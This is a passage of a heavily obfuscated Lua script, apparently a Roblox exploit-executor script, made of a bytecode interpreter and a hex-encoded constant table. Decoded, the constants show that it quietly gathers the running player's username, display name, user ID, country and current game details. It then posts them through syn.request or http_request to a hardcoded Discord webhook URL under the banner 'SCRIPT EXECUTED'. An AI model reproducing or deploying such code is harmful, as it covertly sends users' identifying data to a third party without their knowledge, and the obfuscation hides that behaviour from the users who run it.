1 ;else local v317=0;while true do if (v317==0) then v78[v80[2]]=v183;v72=v80[3];break;end end end break;end end end elseif (v81<=41) then if (v81<=39) then if (v81==38) then if  not v78[v80[2]] then v72=v72 + 1 ;else v72=v80[3];end else do return v78[v80[2]];end end elseif (v81>40) then local v184=v80[2];do return v13(v78,v184,v184 + v80[3] );end else local v185=0;local v186;while true do if (v185==0) then v186=v80[2];v78[v186]=v78[v186](v13(v78,v186 + 1 ,v80[3]));break;end end end elseif (v81<=43) then if (v81>42) then local v187=0;local v188;while true do if (v187==0) then v188=v78[v80[4]];if  not v188 then v72=v72 + 1 ;else v78[v80[2]]=v188;v72=v80[3];end break;end end else local v189=v80[2];local v190=v78[v80[3]];v78[v189 + 1 ]=v190;v78[v189]=v190[v80[4]];end elseif (v81>44) then v78[v80[2]]=v78[v80[3]];elseif v78[v80[2]] then v72=v72 + 1 ;else v72=v80[3];end elseif (v81<=53) then if (v81<=49) then if (v81<=47) then if (v81>46) then local v196=v80[2];do return v13(v78,v196,v73);end else v78[v80[2]]=v78[v80[3]][v80[4]];end elseif (v81==48) then if ((v80[3]=="_ENV") or (v80[3]=="getfenv")) then v78[v80[2]]=v60;else v78[v80[2]]=v60[v80[3]];end else do return v78[v80[2]];end end elseif (v81<=51) then if (v81==50) then if (v80[2]==v78[v80[4]]) then v72=v72 + 1 ;else v72=v80[3];end else local v199=v80[2];local v200=v78[v199];local v201=v80[3];for v229=1,v201 do v200[v229]=v78[v199 + v229 ];end end elseif (v81>52) then local v202=v69[v80[3]];local v203;local v204={};v203=v10({},{__index=function(v232,v233)local v234=v204[v233];return v234[1][v234[2]];end,__newindex=function(v235,v236,v237)local v238=v204[v236];v238[1][v238[2]]=v237;end});for v240=1,v80[4] do local v241=0;local v242;while true do if (v241==1) then if (v242[1]==45) then v204[v240-1 ]={v78,v242[3]};else v204[v240-1 ]={v59,v242[3]};end v77[ #v77 + 1 ]=v204;break;end if (0==v241) then v72=v72 + 1 ;v242=v68[v72];v241=1;end end end v78[v80[2]]=v30(v202,v203,v60);else local v206=0;local v207;local v208;while true do if (1==v206) then for v311=v207 + 1 ,v80[4] do v208=v208   .. v78[v311] ;end v78[v80[2]]=v208;break;end if (v206==0) then v207=v80[3];v208=v78[v207];v206=1;end end end elseif (v81<=57) then if (v81<=55) then if (v81>54) then v72=v80[3];else v78[v80[2]][v80[3]]=v78[v80[4]];end elseif (v81>56) then if (v80[2]==v78[v80[4]]) then v72=v72 + 1 ;else v72=v80[3];end else v78[v80[2]]={};end elseif (v81<=59) then if (v81>58) then v78[v80[2]]=v80[3];else local v215=v80[2];do return v78[v215](v13(v78,v215 + 1 ,v80[3]));end end elseif (v81>60) then local v216=v80[2];local v217=v78[v216];local v218=v80[3];for v243=1,v218 do v217[v243]=v78[v216 + v243 ];end elseif v78[v80[2]] then v72=v72 + 1 ;else v72=v80[3];end v72=v72 + 1 ;break;end end end end;end return v30(v29(),{},v17)(...);end if (v18==1) then function v21(v64,v65,v66)if v66 then local v85=0 + 0 ;local v86;while true do if (v85==(1125 -(936 + 189))) then v86=(v64/((1 + 0 + 1)^(v65-1)))%((1615 -(1565 + 48))^(((v66-((3 -2) + 0)) -(v65-(1139 -(782 + 356)))) + 1)) ;return v86-(v86%(268 -(176 + 91))) ;end end else local v87=(4 -2)^(v65-(1 -0)) ;return (((v64%(v87 + v87))>=v87) and (1093 -(975 + 117))) or (1875 -(157 + (5873 -4155))) ;end end v22=nil;function v22()local v67=v1(v16,v19,v19);v19=v19 + 1 ;return v67;end v23=nil;v18=2;end end end v15("LOL!543O00028O00027O004003053O007063612O6C030E3O0047657450726F64756374496E666F03043O0067616D6503073O00506C6163654964026O000840026O00144003053O007469746C65030B3O006465736372697074696F6E03043O007479706503043O007269636803053O00636F6C6F7203083O00746F6E756D626572023O00809896454103063O00662O6F74657203043O007465787403183O00646973636F72642E2O672F696F736578706C6F697465727303093O0074696D657374616D7003023O006F7303043O006461746503133O002125592D256D2D25645425483A254D3A25535A2O033O0073796E03073O0072657175657374030C3O00682O74705F7265717565737403043O00682O74702O033O0055726C03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3132303834313035363334393631322O3435362F78305F4F6A6C4145506A496B31726636646A6F502D65427865306B4C535A3353656D5164726D52314239517467516C41793932774C775A68462D53654156494E6B48775603063O004D6574686F6403043O00504F535403073O0048656164657273030C3O00436F6E74656E742D5479706503103O00612O706C69636174696F6E2F6A736F6E03043O00426F6479030A3O004A534F4E456E636F646503063O00656D62656473030A3O004765745365727669636503073O00506C6179657273030B3O00482O74705365727669636503123O004D61726B6574706C61636553657276696365030C3O0047726F757053657276696365026O00F03F2O033O004E2F4103073O00556E6B6E6F776E034O00031D3O00682O7470733A2O2F3O772E726F626C6F782E636F6D2F67616D65732F03083O00746F737472696E67026O00104003073O0043726561746F72030B3O0043726561746F7254797065030F3O0043726561746F72546172676574496403043O004E616D65030B3O004465736372697074696F6E03043O0055736572031A3O002O2A47616D652043726561746F7220557365722049443A2O2A2003163O004765744E616D6546726F6D5573657249644173796E63030C3O00556E6B6E6F776E2055736572031D3O00682O7470733A2O2F3O772E726F626C6F782E636F6D2F75736572732F03093O002F70726F66696C652F031A3O002O2A47616D652043726561746F722050726F66696C653A2O2A2003053O0047726F7570031B3O002O2A47616D652043726561746F722047726F75702049443A2O2A20031E3O00682O7470733A2O2F3O772E726F626C6F782E636F6D2F67726F7570732F03183O002O2A47616D652043726561746F722047726F75703A2O2A2003013O002F03093O0055726C456E636F6465030B3O004C6F63616C506C6179657203173O002O23202O5F5343524950542045584543555445442O5F0A030A3O002O2A557365723A2O2A2003023O002028030B3O00446973706C61794E616D6503023O00290A030D3O002O2A557365722049443A2O2A2003063O0055736572496403013O000A030D3O002O2A436F756E7472793A2O2A2003023O002O0A030F3O002O2A47616D65204E616D653A2O2A20030D3O002O2A47616D652049443A2O2A2003163O002O2A47616D65204465736372697074696F6E3A2O2A20030E3O002O2A47616D652055524C3A2O2A2003073O002O2A47616D652003093O00204E616D653A2O2A2003133O004C6F63616C697A6174696F6E536572766963650045012O0012053O00014O0013000100173O0026013O0011000100020004373O0011000100021B00076O0013000800083O00060900080001000100012O002D3O00053O001230001800033O002O200019000300042O0004001A00033O001230001B00053O002O20001B001B00062O000A0018001B00192O0004000A00194O0004000900183O0012053O00073O0026013O0040000100080004373O004000012O003800183O000600102200180009000B0010220018000A001600301C0018000B000C0012300019000E3O001205001A000F4O000C0019000200020010220018000D00192O003800193O000100301C001900110012001022001800100019001230001900143O002O20001900190015001205001A00164O000C0019000200020010220018001300192O0004001700183O001230001800173O00063C0018002B00013O0004373O002B0001001230001800173O002O2000180018001800060B00180030000100010004373O00300001001230001800193O00060B00180030000100010004373O003000010012300018001A3O002O200018001800182O003800193O000400301C0019001B001C00301C0019001D001E2O0038001A3O000100301C001A002000210010220019001F001A00202A001A000200232O0038001C3O00012O0038001D00014O0004001E00174O003D001D00010001001022001C0024001D2O0019001A001C000200102200190022001A2O001F0018000200010004373O00432O010026013O0057000100010004373O00570001001230001800053O00202A001800180025001205001A00264O00190018001A00022O0004000100183O001230001800053O00202A001800180025001205001A00274O00190018001A00022O0004000200183O001230001800053O00202A001800180025001205001A00284O00190018001A00022O0004000300183O001230001800053O00202A001800180025001205001A00294O00190018001A00022O0004000400183O0012053O002A3O000E320007006D00013O0004373O006D00010012050018002B3O001205000C002B4O0004000B00183O0012050018002B3O0012050019002B3O001205000F002C4O0004000E00194O0004000D00183O0012050018002D3O0012050019002D3O0012050012002D4O0004001100194O0004001000183O0012050018002E3O0012300019002F3O001230001A00053O002O20001A001A00062O000C0019000200022O000F0013001800190012053O00303O000E32003000362O013O0004373O00362O0100063C000900022O013O0004373O00022O0100063C000A00022O013O0004373O00022O01001205001800014O0013001900193O00260100180075000100010004373O00750001001205001900013O002601001900870001002A0004373O00870001001205001A00013O002601001A0082000100010004373O00820001002O20001B000A0031002O20000D001B0032002O20001B000A0031002O20000E001B0033001205001A002A3O002601001A007B0001002A0004373O007B0001001205001900023O0004373O008700010004373O007B00010026010019009A000100010004373O009A0001001205001A00013O002601001A008E0001002A0004373O008E00010012050019002A3O0004373O009A0001002601001A008A000100010004373O008A00012O0004001B00073O002O20001C000A00342O000C001B000200022O0004000B001B3O002O20001B000A0035000624000C00980001001B0004373O00980001001205000C002B3O001205001A002A3O0004373O008A000100260100190078000100020004373O00780001002601000D00D1000100360004373O00D10001001205001A00014O0013001B001D3O002601001A00CA0001002A0004373O00CA00012O0013001D001D3O002601001B00AE0001002A0004373O00AE0001001205001200373O001230001E00033O002O20001F000100382O0004002000014O00040021000E4O000A001E0021001F2O0004001D001F4O0004001C001E3O001205001B00023O002601001B00B6000100020004373O00B6000100063C001C00B400013O0004373O00B40001000624000F00B50001001D0004373O00B50001001205000F00393O0004373O00F40001002601001B00A3000100010004373O00A30001001205001E00013O002601001E00C3000100010004373O00C30001001205001F003A3O0012300020002F4O00040021000E4O000C0020000200020012050021003B4O000F0010001F00210012050011003C3O001205001E002A3O002601001E00B90001002A0004373O00B90001001205001B002A3O0004373O00A300010004373O00B900010004373O00A300010004373O00F40001002601001A00A0000100010004373O00A00001001205001B00014O0013001C001C3O001205001A002A3O0004373O00A000010004373O00F40001002601000D00F40001003D0004373O00F40001001205001A00014O0013001B001B3O002601001A00D5000100010004373O00D50001001205001B00013O002601001B00E00001002A0004373O00E000010012050012003E4O0004001C00064O0004001D000E4O000C001C000200022O0004000F001C3O0004373O00F40001002601001B00D8000100010004373O00D80001001205001C00013O002601001C00E70001002A0004373O00E70001001205001B002A3O0004373O00D80001000E32000100E30001001C0004373O00E30001001205001D003F3O001230001E002F4O0004001F000E4O000C001E000200022O000F0010001D001E001205001100403O001205001C002A3O0004373O00E300010004373O00D800010004373O00F400010004373O00D50001001205001A002E3O001230001B002F3O001230001C00053O002O20001C001C00062O000C001B00020002001205001C00413O00202A001D000200422O0004001F000B4O0019001D001F00022O000F0013001A001D0004373O00022O010004373O007800010004373O00022O010004373O00750001002O200014000100432O0004001800084O0004001900144O000C0018000200022O0004001500183O001205001800443O001205001900453O002O20001A00140034001205001B00463O002O20001C00140047001205001D00483O001205001E00493O001230001F002F3O002O2000200014004A2O000C001F000200020012050020004B3O0012050021004C4O0004002200153O0012050023004D3O0012050024004E4O00040025000B3O0012050026004B3O0012050027004F3O001230002800053O002O200028002800060012050029004B3O001205002A00504O0004002B000C3O001205002C004D3O001205002D00514O0004002E00133O001205002F004D3O001205003000523O002601000D00282O0100360004373O00282O01001205003100313O00060B003100292O0100010004373O00292O010012050031003D3O001205003200534O00040033000F3O0012050034004B4O0004003500123O0012300036002F4O00040037000E4O000C0036000200020012050037004B4O0004003800114O0004003900103O001205003A004B4O000F00160018003A0012053O00083O0026013O00020001002A0004373O00020001001230001800053O00202A001800180025001205001A00544O00190018001A00022O0004000500184O0013000600063O00060900060002000100012O002D3O00044O0013000700073O0012053O00023O0004373O000200012O001E8O00073O00013O00033O00053O0003053O006D61746368030C3O005E25732A282E2D2925732A2403043O006773756203023O00252E034O0001093O00202A00013O0001001205000300024O001900010003000200202A000100010003001205000300043O001205000400054O0012000100044O000600016O00073O00017O00043O00028O00026O00F03F03053O007063612O6C03073O00556E6B6E6F776E01213O001205000100014O0013000200043O0026010001001A000100020004373O001A00012O0013000400043O00260100020005000100010004373O00050001001205000500013O00260100050008000100010004373O00080001001230000600033O00060900073O000100022O00158O002D8O00170006000200072O0004000400074O0004000300063O00063C0003001500013O0004373O0015000100062400060016000100040004373O00160001001205000600044O0031000600023O0004373O000800010004373O000500010004373O0020000100260100010002000100010004373O00020001001205000200014O0013000300033O001205000100023O0004373O000200012O00073O00013O00013O00013O00031E3O00476574436F756E747279526567696F6E466F72506C617965724173796E6300064O00107O00202A5O00012O0010000200014O00123O00024O00068O00073O00017O00083O00028O0003053O007063612O6C03113O0047657447726F7570496E666F4173796E6303043O004E616D6503043O007761726E03233O004661696C656420746F2066657463682067726F7570206E616D6520666F722049443A2003083O00746F737472696E67030D3O00556E6B6E6F776E2047726F7570012B3O001205000100014O0013000200033O00260100010002000100010004373O00020001001230000400024O001000055O002O200005000500032O001000066O000400076O000A0004000700052O0004000300054O0004000200043O00063C0002001100013O0004373O00110001002O200004000300042O0031000400023O0004373O002A0001001205000400014O0013000500053O00260100040013000100010004373O00130001001205000500013O00260100050016000100010004373O00160001001205000600013O00260100060019000100010004373O00190001001230000700053O001205000800063O001230000900074O0004000A6O000C0009000200022O000F0008000800092O001F000700020001001205000700084O0031000700023O0004373O001900010004373O001600010004373O002A00010004373O001300010004373O002A00010004373O000200012O00073O00017O00",v9(),...);
